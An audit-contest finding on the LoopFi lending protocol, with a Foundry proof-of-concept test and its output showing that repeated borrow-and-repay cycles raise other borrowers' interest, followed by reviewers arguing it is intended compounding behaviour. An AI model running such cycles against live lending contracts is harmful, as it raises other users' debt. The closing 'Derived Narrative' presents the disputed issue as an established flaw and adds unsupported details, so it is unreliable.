---
id: 21701
severity: "High"
---

# Malicious borrower cycle exploits to inflate interest rates

## Description

The current implementation allows a malicious actor to artificially inflate interest rates for all borrowers in the system through rapid borrow-and-repay cycles. This exploit can lead to:

1. Increased costs for legitimate borrowers who may face higher interest rates than expected.
2. Potential forced liquidations of other borrowers if interest rates rise rapidly enough to push their positions into unsafe territory.
3. Unfair advantage for the attacker if they are also a lender in the system, as they could increase returns on their deposits.

This vulnerability undermines the fairness and stability of the lending platform, potentially leading to loss of funds for users.

## Proof of Concept

The following test demonstrates the attack by comparing interest accrual with and without the borrow-repay cycles, please add this test function to `CDPVault.t.sol` test file:

```solidity
function test_borrow_repay_cycles_with_attack() public {
    compare_interest_accrual_with_borrow_repay_cycles(true);
}
function test_borrow_repay_cycles_without_attack() public {
    compare_interest_accrual_with_borrow_repay_cycles(false);
}

// A cycle borrower can increase the interest rate on other borrowers by borrow and repay.
function compare_interest_accrual_with_borrow_repay_cycles(bool attack) internal {

    console.log(attack ? "Cycle borrower is attacking" : "Cycle borrower is NOT attacking");

    CDPVault vault = createCDPVault(token, 1000 ether, 0, 1.25 ether, 1.0 ether, 0);
    createGaugeAndSetGauge(address(vault));

    // Setup two borrowers
    address normalBorrower = address(0x1);
    address cycleBorrower = address(0x2);
    address normalBorrower2 = address(0x3);

    // Deposit more collateral to ensure safe ratios
    uint256 collateralAmount = 200 ether;
    token.mint(normalBorrower, collateralAmount);
    vm.prank(normalBorrower);
    token.approve(address(vault), collateralAmount);
    vm.prank(normalBorrower);
    vault.deposit(normalBorrower, collateralAmount);

    token.mint(normalBorrower2, collateralAmount);
    vm.prank(normalBorrower2);
    token.approve(address(vault), collateralAmount);
    vm.prank(normalBorrower2);
    vault.deposit(normalBorrower2, collateralAmount);

    {
        token.mint(cycleBorrower, collateralAmount);
        console.log("Cycle borrower Balance Before:", token.balanceOf(cycleBorrower));
    }
    vm.prank(cycleBorrower);
    token.approve(address(vault), collateralAmount);
    vm.prank(cycleBorrower);
    vault.deposit(cycleBorrower, collateralAmount);

    // Both borrowers take out initial loans
    uint256 borrowAmount = 50 ether;
    vm.prank(normalBorrower);
    vault.modifyCollateralAndDebt(normalBorrower, normalBorrower, normalBorrower, 0, int256(borrowAmount));
    vm.prank(normalBorrower2);
    vault.modifyCollateralAndDebt(normalBorrower2, normalBorrower2, normalBorrower2, 0, int256(borrowAmount));

    // Record initial state
    uint256 initialDebtNormal = vault.virtualDebt(normalBorrower);
    uint256 initialDebtNormal2 = vault.virtualDebt(normalBorrower2);
    uint256 initialDebtCycle = vault.virtualDebt(cycleBorrower);

    console.log("Initial state:");
    logPoolState(vault);

    // Simulate passage of time and borrow-repay cycles
    uint256 cycles = 10;
    uint256 timeBetweenCycles = 1 hours;

    // Mint a large amount of WETH to this contract to cover all potential debts
    mockWETH.mint(address(this), 1000 ether);
    {

        for (uint256 i = 0; i < cycles; i++) {
            if (attack) {
                vm.startPrank(cycleBorrower);

                vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, int256(borrowAmount));

                // Repay all debt
                uint256 currentDebt = vault.virtualDebt(cycleBorrower);

                if (currentDebt > 0) {
                    mockWETH.transfer(cycleBorrower, currentDebt);
                    mockWETH.approve(address(vault), currentDebt);
                    vault.modifyCollateralAndDebt(cycleBorrower, cycleBorrower, cycleBorrower, 0, -int256(currentDebt));
                }

                console.log("Borrow and repay Cycle: #", i + 1);

                vm.stopPrank();
            }
            // Advance time
            vm.warp(block.timestamp + timeBetweenCycles);
        }
    }
    vm.startPrank(cycleBorrower);
    vault.withdraw(cycleBorrower, collateralAmount);
    vm.stopPrank();

    // Check final debts
    uint256 finalDebtNormal = vault.virtualDebt(normalBorrower);
    uint256 finalDebtNormal2 = vault.virtualDebt(normalBorrower2);

    // Calculate accrued interest
    console.log("Debts ======");

    console.log("initialDebtNormal:", initialDebtNormal);
    console.log("finalDebtNormal:", finalDebtNormal);
    console.log("initialDebtNormal2:", initialDebtNormal2);
    console.log("finalDebtNormal2:", finalDebtNormal2);

    uint256 accruedInterestNormal = finalDebtNormal - initialDebtNormal;
    uint256 accruedInterestNormal2 = finalDebtNormal2 - initialDebtNormal2;

    // Calculate accrued interest
    console.log("\n Accrued interest ======");
    console.log("Normal borrower initial debt:", initialDebtNormal);
    console.log("Normal borrower final debt:", finalDebtNormal);
    console.log("Normal borrower accrued interest:", accruedInterestNormal);

    console.log("Normal borrower 2 initial debt:", initialDebtNormal2);
    console.log("Normal borrower 2 final debt:", finalDebtNormal2);
    console.log("Normal borrower 2 accrued interest:", accruedInterestNormal2);
    console.log("======");

    logPoolState(vault);

    logBalance(cycleBorrower);
}

function logBalance(address addr) internal view {
    console.log("Cycle borrower Balance After:", token.balanceOf(addr));
}

function logPoolState(CDPVault vault) internal view {
    address poolAddress = address(vault.pool());
    console.log("  Total Debt:", vault.totalDebt());
    console.log("  Expected Liquidity:", IPoolV3(poolAddress).expectedLiquidity());
    console.log("  Available Liquidity:", IPoolV3(poolAddress).availableLiquidity());
    console.log("  Utilization:", calculateUtilization(
        IPoolV3(poolAddress).expectedLiquidity(),
        IPoolV3(poolAddress).availableLiquidity()
    ));
    console.log("  Base Interest Rate:", IPoolV3(poolAddress).baseInterestRate());
}

function calculateUtilization(uint256 expectedLiquidity, uint256 availableLiquidity) internal pure returns (uint256) {
    if (expectedLiquidity == 0) return 0;
    return ((expectedLiquidity - availableLiquidity) * 10000) / expectedLiquidity;
}
```

**Results from the test output:**

1. With attack:

   * Normal borrower accrued interest: `5766476609207981`
   * Base Interest Rate after cycles: `100023531853668664470588235`
2. Without attack:

   * Normal borrower accrued interest: `5766183185603008`
   * Base Interest Rate after cycles: `100023529411764705882352941`

The attack results in higher accrued interest for normal borrowers and an increased base interest rate, despite the total debt remaining the same.

**The output:**

[PASS] test_borrow_repay_cycles_with_attack() (gas: 5103632)
Logs:
  Cycle borrower is attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Borrow and repay Cycle: # 1
  Borrow and repay Cycle: # 2
  Borrow and repay Cycle: # 3
  Borrow and repay Cycle: # 4
  Borrow and repay Cycle: # 5
  Borrow and repay Cycle: # 6
  Borrow and repay Cycle: # 7
  Borrow and repay Cycle: # 8
  Borrow and repay Cycle: # 9
  Borrow and repay Cycle: # 10
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766476609207981
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766476609207981

 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766476609207981
  Normal borrower accrued interest: 5766476609207981
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766476609207981
  Normal borrower 2 accrued interest: 5766476609207981
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366510584090
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023531853668664470588235
  Cycle borrower Balance After: 200000000000000000000

[PASS] test_borrow_repay_cycles_without_attack() (gas: 4077140)
Logs:
  Cycle borrower is NOT attacking
  Cycle borrower Balance Before: 200000000000000000000
  Initial state:
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000000000000000000000
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Debts ======
  initialDebtNormal: 50000000000000000000
  finalDebtNormal: 50005766183185603008
  initialDebtNormal2: 50000000000000000000
  finalDebtNormal2: 50005766183185603008

 Accrued interest ======
  Normal borrower initial debt: 50000000000000000000
  Normal borrower final debt: 50005766183185603008
  Normal borrower accrued interest: 5766183185603008
  Normal borrower 2 initial debt: 50000000000000000000
  Normal borrower 2 final debt: 50005766183185603008
  Normal borrower 2 accrued interest: 5766183185603008
  ======
    Total Debt: 100000000000000000000
    Expected Liquidity: 1000000011532366371206016
    Available Liquidity: 999900000000000000000000
    Utilization: 1
    Base Interest Rate: 100023529411764705882352941
  Cycle borrower Balance After: 200000000000000000000

To run the test:

forge test --match-test "test_borrow_repay_cycles" -vv

## Recommendation

* Consider adding a fee for taking a loan (including same block loan) to disincentivize this behavior.
  * Add a minimum duration for loans, requiring borrowers to hold the loan for a set period before repaying.

This is an expected behaviour since the base rate will depend on the utilization rate so if a user borrows rates will increase.

@0xtj24 - Per my understanding, the main issue is a risk free attack to inflate the rates since the attacker doesn’t pay any fee.

@Koolex - I believe this is intended, if the user is borrowing debt, then repaying the debt; i.e., the protocol is making some profit, the interest rate should indeed increase. As the sponsor mentioned, it depends on the utilization rate. This can’t even be considered griefing as the attacker will lose money, as he’ll be continuously paying his debt + some interest. 

Hence, I believe this is invalid.

Agree with @0xAlix2. The “attacker” needs to pay off debt himself, so this is not risk-free. Technically this isn’t an attack, more like continuously borrowing/repaying assets and paying the debt, which is do-able on any lending protocol.

The attacker has their balance (before and after) the same `200000000000000000000`. Stays as-is.

@Koolex - Apologies for replying out of PJQA phase, but I want to point out something that is not mentioned before. I misunderstood this issue in the beginning, and after going through the coded PoC in depth, I believe this is definitely by design and not an issue.

In the coded PoC, it is true `test_borrow_repay_cycles_with_attack` will inflate the rate higher than `test_borrow_repay_cycles_without_attack`, and the “attacker” does not lose anything but gas fee. However, this is due to the fact that borrow rate is compounded, and each time “attacker” triggers a transaction to the CDPVault, the borrow rate is updated.

For example, if the borrow rate is 10% per year.

  * If rate update is only triggered once 1 year later, the final borrow rate will be `110%`.
  * However, if it triggered twice (once per half year), the borrow rate will be `105% * 105% = 110.25%`.

Similarly, if the rate update is triggered more frequently, the borrow rate would be higher. The key is, there is an upper limit to this (See [continuous compounding](https://en.wikipedia.org/wiki/Compound_interest)).

It is actually quite normal for these lending protocols to implement a simple compound mechanism to be triggered per transaction, since it is a much easier design than continuous compounding; E.g., CompoundV2 uses the similar mechanism.

Thus I strongly believe this is by design and not a high severity issue. I’d appreciate if you can reconsider this issue. Thanks!

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/PoolV3.sol#L642-L678>

```solidity
    function _updateBaseInterest(
        int256 expectedLiquidityDelta,
        int256 availableLiquidityDelta,
        bool checkOptimalBorrowing
    ) internal {
        uint256 expectedLiquidity_ = (expectedLiquidity().toInt256() + expectedLiquidityDelta).toUint256();
        uint256 availableLiquidity_ = (availableLiquidity().toInt256() + availableLiquidityDelta).toUint256();

        uint256 lastBaseInterestUpdate_ = lastBaseInterestUpdate;
        if (block.timestamp != lastBaseInterestUpdate_) {
            _baseInterestIndexLU = _calcBaseInterestIndex(lastBaseInterestUpdate_).toUint128(); // U:[LP-18]
            lastBaseInterestUpdate = uint40(block.timestamp);
        }

        if (block.timestamp != lastQuotaRevenueUpdate) {
            lastQuotaRevenueUpdate = uint40(block.timestamp); // U:[LP-18]
        }

        _expectedLiquidityLU = expectedLiquidity_.toUint128(); // U:[LP-18]
        _baseInterestRate = ILinearInterestRateModelV3(interestRateModel)
            .calcBorrowRate({
                expectedLiquidity: expectedLiquidity_,
                availableLiquidity: availableLiquidity_,
                checkOptimalBorrowing: checkOptimalBorrowing
            })
            .toUint128(); // U:[LP-18]
    }

    /// @dev Computes base interest accrued since given timestamp
    function _calcBaseInterestAccrued(uint256 timestamp) private view returns (uint256) {
        return (_totalDebt.borrowed * baseInterestRate().calcLinearGrowth(timestamp)) / RAY;
    }

    /// @dev Computes current value of base interest index
    function _calcBaseInterestIndex(uint256 timestamp) private view returns (uint256) {
        return (_baseInterestIndexLU * (RAY + baseInterestRate().calcLinearGrowth(timestamp))) / RAY;
    }
```

Still, the attacker is manipulating the interest rate without risk. 

It seems the attacker does not “manipulate” or “inflate” the rate. Instead he is actually increasing the precision of interest calculation. For example, suppose the target rate is `e`, then for `(1+1/t)^t`, the larger `t` is, the more precise it will be.

@Koolex - What @xuwinnie said is correct, the _attacker_ is actually just making the interest rate more accurate to a continuous compounding, and not _maliciously_ inflating the interest, since the upper bound is always continuous compounding.

I would argue at least this is not a _high sev_ since there are no stealing funds or making borrowers lose pay more interest than they should. The so-called _attackers_ are just making borrowers pay what they are supposed to pay.

@pkqs90 - Compare debts in both cases, they are different even though there was no profit for the protocol. Doing this continuously will increase the rate. This can be utilized in many ways by different actors (including adversaries):

`Normal borrower final debt: 50005766476609207981` vs `Normal borrower final debt: 50005766183185603008`

For transparency, no further comments will be added from my side.

_Note: For full discussion, see[here](https://github.com/code-423n4/2024-07-loopfi-findings/issues/129)._

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an interest‑rate manipulation flaw that allows a borrower to repeatedly borrow and immediately repay a loan in order to trigger the protocol’s interest‑rate update logic many times in a short period. The lending contract calculates the base borrow rate on every state‑changing operation (borrow, repay, or collateral change) using a linear interest‑rate model that depends on the current utilization of the pool. Because the calculation is performed per transaction and there is no fee or minimum loan duration, an attacker can execute a rapid borrow‑repay cycle repeatedly, effectively increasing the frequency of compounding. Each additional update slightly raises the base rate, and the cumulative effect of many updates makes the effective annualised rate higher than it would be if the rate were updated only after a longer time interval. This behaviour inflates the interest rate for all other borrowers in the pool, causing their debt to grow faster than expected. Legitimate users may notice that their accrued interest is larger than projected, that their loan balances increase more quickly, or that they become eligible for liquidation even though their collateral ratio has not materially changed. The attack does not require the attacker to lose capital – the attacker’s own balance before and after the cycle remains unchanged apart from gas costs – because the borrowed amount is repaid in the same transaction, so the net debt of the attacker is zero. The flaw is triggered whenever the protocol allows same‑block or very short‑interval borrowing without imposing a fee or a minimum holding period, and when the interest‑rate model is updated on every transaction rather than being time‑averaged. It was discovered during a formal audit when a test case compared interest accrual with and without the borrow‑repay cycles and observed a measurable increase in the base interest rate and in the accrued interest of unrelated borrowers. The issue is subtle because the rate increase appears to be a normal consequence of higher utilization, and no funds are directly stolen; however, it violates the economic assumption that interest rates should reflect genuine pool utilisation rather than artificial transaction frequency. To remediate the problem the protocol should either charge a small fee on each loan, enforce a minimum loan duration before repayment is allowed, or redesign the rate‑update mechanism to use a time‑weighted average or limit the frequency of updates, thereby preventing an attacker from inflating rates through rapid cycles.
